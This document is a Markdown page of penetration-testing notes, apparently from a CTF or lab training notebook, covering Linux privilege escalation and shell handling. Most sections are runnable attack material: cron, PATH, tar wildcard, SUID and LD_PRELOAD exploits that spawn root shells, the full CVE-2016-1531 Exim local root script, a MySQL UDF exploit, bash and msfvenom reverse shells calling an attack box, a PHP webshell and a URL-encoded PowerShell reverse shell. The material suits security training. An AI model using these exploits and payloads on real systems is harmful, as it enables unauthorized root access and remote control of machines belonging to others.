<a name="top"></a>[:house:](README.md)

# :skull: Notes

- [Cron Job File Permissions](#notebook-cron-job-file-permissions)
- [Cron Job Path Environment Variable](#notebook-cron-job-path-environment-variable)
- [Cron Job Wildcards](#notebook-cron-job-wildcards)
- [Default Security Groups](#notebook-default-security-groups)
- [/etc/crontab Format](#notebook-etccrontab-format)
- [/etc/passwd Format](#notebook-etcpasswd-format)
- [Exim 4.84-3 Local Privilege Escalation](#notebook-exim-4.84-3-local-privilege-escalation)
- [FileZilla Credentials Locations](#notebook-filezilla-credentials-locations)
- [Kali Paths To Useful Things](#notebook-kali-paths-to-useful-things)
- [MySQL UDF Exploit](#notebook-mysql-udf-exploit)
- [Privilege Escalation](#notebook-privilege-escalation)
- [SUID/SGID Executables - Environment Variables](#notebook-suidsgid-executables---environment-variables)
- [SUID/SGID Executables - Shared Object Injection](#notebook-suidsgid-executables---shared-object-injection)
- [Shell Stabilization](#notebook-shell-stabilization)
- [Simple PHP Webshell](#notebook-simple-php-webshell)
- [Sudo - Environment Variables](#notebook-sudo---environment-variables)
- [URL Encoded Powershell Reverse Shell](#notebook-url-encoded-powershell-reverse-shell)

## :notebook: Cron Job File Permissions

### Scenario

Examining the contents of `/etc/crontab` you find jobs executed by world-writable files.

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

```
$ find / -name "overwrite.sh" 2>/dev/null
/usr/local/bin/overwrite.sh
```

World-writable.

```
$ ls -l /usr/local/bin/overwrite.sh 
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```

Not world-writable.

```
$ ls -l /usr/local/bin/compress.sh 
-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh
```

#### Set Up

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your attack box.

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

#### Exploit

Set up a netcat listener on your attack box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

```
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.103.166] 47028
bash: no job control in this shell
root@debian:~#
```

<p align="right"><a href="#notebook-cron-job-file-permissions">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Cron Job Path Environment Variable

### Scenario

View the contents of the system-wide crontab:

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

Note that the `PATH` variable starts with `/home/user` which is our user's home directory.

#### Set Up

Create a file called `overwrite.sh` in `/home/user` with the following contents:

```shell
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

```shell
$ chmod +x /home/user/overwrite.sh
```

#### Exploit

Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:

```shell
$ /tmp/rootbash -p
```

<p align="right"><a href="#notebook-cron-job-path-environment-variable">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Cron Job Wildcards

### Scenario

View the contents of the system-wide crontab:

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

View the contents of `compress.sh`:

```shell
$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Note that the `tar` command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

```shell
$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### Set Up

Use msfvenom on your attack box to generate a reverse shell ELF binary. Update the `LHOST` IP address accordingly:

```shell
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Transfer the shell.elf file to /home/user/ on the target (you can use scp or host the file on a webserver on your attack box and use `wget`). Make sure the file is executable:

```shell
$ chmod +x /home/user/shell.elf
```

Create these two files in /home/user:

```shell
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
```

When the `tar` command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid `tar` command line options, `tar` will recognize them as such and treat them as command line options rather than filenames.

#### Exploit

Set up a netcat listener on your attack box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

```shell
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.6.46.173] from (UNKNOWN) [10.10.1.64] 56460
ls
--checkpoint-action=exec=shell.elf
--checkpoint=1
myvpn.ovpn
shell.elf
tools
whoami
root
```

<p align="right"><a href="#notebook-cron-job-wildcards">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Default Security Groups

- **Domain Controllers** - All domain controllers in the domain
- **Domain Guests** - All domain guests
- **Domain Users** - All domain users
- **Domain Computers** - All workstations and servers joined to the domain
- **Domain Admins** - Designated administrators of the domain
- **Enterprise Admins** - Designated administrators of the enterprise
- **Schema Admins** - Designated administrators of the schema
- **DNS Admins** - DNS Administrators Group
- **DNS Update Proxy** - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
- **Allowed RODC Password Replication Group** - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
- **Group Policy Creator Owners** - Members in this group can modify group policy for the domain
- **Denied RODC Password Replication Group** - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
- **Protected Users** - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
- **Cert Publishers** - Members of this group are permitted to publish certificates to the directory
- **Read-Only Domain Controllers** - Members of this group are Read-Only Domain Controllers in the domain
- **Enterprise Read-Only Domain Controllers** - Members of this group are Read-Only Domain Controllers in the enterprise
- **Key Admins** - Members of this group can perform administrative actions on key objects within the domain.
- **Enterprise Key Admins** - Members of this group can perform administrative actions on key objects within the forest.
- **Cloneable Domain Controllers** - Members of this group that are domain controllers may be cloned.
- **RAS and IAS Servers** - Servers in this group can access remote access properties of users

<p align="right"><a href="#notebook-default-security-groups">:up:</a> <a href="#top">:top:</a></p>

## :notebook: /etc/crontab Format

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

**#** = ID

**m** = Minute

**h** = Hour

**dom** = Day of the month

**mon** = Month

**dow** = Day of the week

**user** = What user the command will run as

**command** = What command should be run

For example,

```
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

<p align="right"><a href="#notebook-etccrontab-format">:up:</a> <a href="#top">:top:</a></p>

## :notebook: /etc/passwd Format

The `/etc/passwd` file contains one entry per line for each user (user account) of the system. All fields are separated by a colon `:` symbol. Total of seven fields as follows. Generally, `/etc/passwd` file entry looks as follows:

```
test:x:0:0:root:/root:/bin/bash
```

### Sections

- **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
- **Password**: An `x` character indicates that encrypted password is stored in `/etc/shadow` file. Please note that you need to use the `passwd` command to compute the hash of a password typed at the CLI or to store/update the hash of the password in `/etc/shadow` file, in this case, the password hash is stored as an `x`.
- **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further, UID 100-999 are reserved by system for administrative and system accounts/groups.
- **Group ID (GID)**: The primary group ID (stored in /etc/group file).
- **User ID Info**: The comment field. It allows you to add extra information about the users such as userâ€™s full name, phone number, etc. This field is used by the finger command.
- **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
- **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it *does not have to be a shell*.

### How to exploit a writable /etc/passwd

It's simple really, if we have a writable `/etc/passwd` file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

<p align="right"><a href="#notebook-etcpasswd-format">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Exim 4.84-3 Local Privilege Escalation

```shell
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

<p align="right"><a href="#notebook-exim-4.84-3-local-privilege-escalation">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Filezilla Credentials Locations

- `C:\Program Files\FileZilla Server\FileZilla Server.xml`
- `C:\xampp\FileZilla Server\FileZilla Server.xml`

<p align="right"><a href="#notebook-filezilla-credentials-locations">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Kali Paths To Useful Things

- `/usr/share/john` - Xtojohn conversion tools.
- `/usr/share/nmap/scripts` - NSE scripts.
- `/usr/share/webshells` - A variety of webshells.
- `/usr/share/windows-resources/binaries` - Useful Windows things.
- `/usr/share/wordlists` - Home of rockyou.txt and dirbuster wordlists.

<p align="right"><a href="#notebook-kali-paths-to-useful-things">:up:</a> <a href="#top">:top:</a></p>

## :notebook: MySQL UDF Exploit

### Scenario

The MySQL service is running as root and the root user for the service does not have a password assigned. We can use a popular [exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of **User Defined Functions (UDFs)** to run system commands as root via the MySQL service.

### Setup

Assuming an exploit source file name of `raptor_udf2.c`.

Compile the raptor_udf2.c exploit code using the following commands:

```
$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password:

```
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) `do_system` using our compiled exploit:

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:

```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

### Exploit

Exit out of the MySQL shell (type `exit` or `\q` and press Enter) and run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:

```
/tmp/rootbash -p
```

<p align="right"><a href="#notebook-mysql-udf-exploit">:up:</a> <a href="#top">:top:</a></p>

## :notebook: SUID/SGID Executables - Environment Variables

### Scenario

While finding all SUID/SGID executables we discover that `/usr/local/bin/suid-env` can be exploited due to it inheriting the user's `PATH` environment variable and attempting to execute programs without specifying an absolute path.

```shell
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

First, execute the file and note that it seems to be trying to start the apache2 webserver:

```shell
$ /usr/local/bin/suid-env
[....] Starting web server: apache2httpd (pid 1686) already running
. ok 
```

Run `strings` on the file to look for strings of printable characters:

```shell
$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

One line `service apache2 start"` suggests that the service executable is being called to start the webserver, however the full path of the executable `/usr/sbin/service` is not being used.

### Set up

Compile the code below into an executable called `service`. This code simply spawns a Bash shell:

```c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

```shell
$ gcc -o service /home/user/tools/suid/service.c
```

### Exploit

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the `suid-env` executable to gain a root shell:

```shell
PATH=.:$PATH /usr/local/bin/suid-env
```

<p align="right"><a href="#notebook-suidsgid-executables---environment-variables">:up:</a> <a href="#top">:top:</a></p>

## :notebook: SUID/SGID Executables - Shared Object Injection

### Scenario

While finding all SUID/SGID executables we discover that `/usr/local/bin/suid-so` is vulnerable to shared object injection.

```shell
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

### Set Up

First, execute the file and note that currently it displays a progress bar before exiting:

```shell
$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
```

Run `strace` on the file and search the output for open/access calls and for "no such file" errors:

```shell
$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory
```

Note that the executable tries to load the `/home/user/.config/libcalc.so` shared object within our home directory, but it cannot be found.

Create the `.config` directory for the `libcalc.so` file:

```shell
$ mkdir /home/user/.config
```

Here is an example libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the `suid-so` executable was looking for it:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

```shell
$ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

### Exploit

Execute the `suid-so` executable again, and note that this time, instead of a progress bar, we get a root shell.

```shell
$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# whoami
root
bash-4.1# exit
exit
[=====================================================================>] 99 %
Done.
```

<p align="right"><a href="#notebook-suidsgid-executables---shared-object-injection">:up:</a> <a href="#top">:top:</a></p>

# :notebook: Shell Stabilization

- [rlwrap](#page_facing_up-rlwrap)
- [Stabilizing With Socat](#page_facing_up-stabilizing-with-socat)
- [Stabilizing A Linux Shell](#page_facing_up-stabilizing-a-linux-shell)

### :page_facing_up: rlwrap

**rlwrap** is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

```
rlwrap nc -lvnp <port>
```

Prepending our netcat listener with `rlwrap` gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by backgrounding the shell with Ctrl+Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### :page_facing_up: Stabilizing With Socat

Another way to stabilize a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`).
 
### :page_facing_up: Stabilizing A Linux Shell

- `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl+C will kill the shell.
- `export TERM=xterm` will give us access to term commands such as `clear`.
- background the shell using Ctrl+Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl+C to kill processes). It then foregrounds the shell, thus completing the process.
- Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter. 

<p align="right"><a href="#notebook-stabilizing-a-linux-shell">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Simple PHP Webshell

```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

<p align="right"><a href="#notebook-simple-php-webshell">:up:</a> <a href="#top">:top:</a></p>

## :notebook: Sudo - Environment Variables

### Scenario 1

Running `sudo -l` on a user shows that both `LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.

```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

#### Set Up

Create and compile the following shared object named `preload.c`.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

#### Exploit

Run one of the programs you are allowed to run via sudo (listed when running `sudo -l`), while setting the `LD_PRELOAD` environment variable to the full path of the new shared object:

```
$ sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

A root shell should spawn.

### Scenario 2

Given the same `sudo -l` output as **Scenario 1**.

Run `ldd` against the `apache2` program file to see which shared libraries are used by the program:

```
$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff0ddff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fc5fabf9000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fc5fa9d5000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fc5fa79b000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fc5fa57f000)
        libc.so.6 => /lib/libc.so.6 (0x00007fc5fa213000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007fc5fa00e000)
        librt.so.1 => /lib/librt.so.1 (0x00007fc5f9e06000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fc5f9bcf000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007fc5f99ca000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fc5f97a2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc5fb0b6000)
```

#### Set Up

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the following code:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
```

#### Exploit

Run apache2 using sudo, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp` (where we output the compiled shared object):

```
$ sudo LD_LIBRARY_PATH=/tmp apache2
```

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

See: [Create A Shared Object](tools.md#create-a-shared-object)

<p align="right"><a href="#notebook-sudo---environment-variables">:up:</a> <a href="#top">:top:</a></p>

## :notebook: URL Encoded Powershell Reverse Shell

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27**\<IP>**%27%2C**\<PORT>**%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

See: [Powershell Reverse Shell](commands.md#powershell-reverse-shell)

<p align="right"><a href="#notebook-url-encoded-powershell-reverse-shell">:up:</a> <a href="#top">:top:</a></p>

<p align="center"><img src="https://picsum.photos/800/100"></p>

